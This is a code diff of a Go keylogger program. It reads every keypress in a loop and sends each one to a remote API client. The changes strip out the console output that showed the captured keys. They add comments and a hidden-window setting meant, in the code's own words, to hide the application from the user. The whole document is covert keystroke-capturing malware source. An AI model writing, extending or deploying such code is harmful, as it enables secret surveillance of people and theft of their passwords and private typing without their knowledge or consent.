@@ -1,14 +1,13 @@
 package main
 
-//import "os"
 import (
 	"os/exec"
+	"syscall"
 	"time"
+
+	"github.com/kanadez/hidden/api"
+	"github.com/kindlyfire/go-keylogger"
 )
-import "fmt"
-import "syscall"
-import "github.com/kindlyfire/go-keylogger"
-import "github.com/kanadez/hidden/api"
 
 const (
 	key_fetch_delay_in_ms = 5
@@ -24,17 +23,15 @@ func main() {
 		key := keylogger.GetKey()
 
 		if !key.Empty {
-			fmt.Printf("'%c' %d                     \n", key.Rune, key.Keycode)
 			apiClient.StoreKey(key)
 		}
 
-		empty_counter++
-
-		fmt.Printf("Empty count: %d\r", empty_counter)
-
+		// To hide application window from user
 		cmd := exec.Command("cmd", "/C", string(empty_counter))
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
+		// To hold key logging running indefinitely
+		empty_counter++
 		time.Sleep(key_fetch_delay_in_ms * time.Millisecond)
 	}
 }
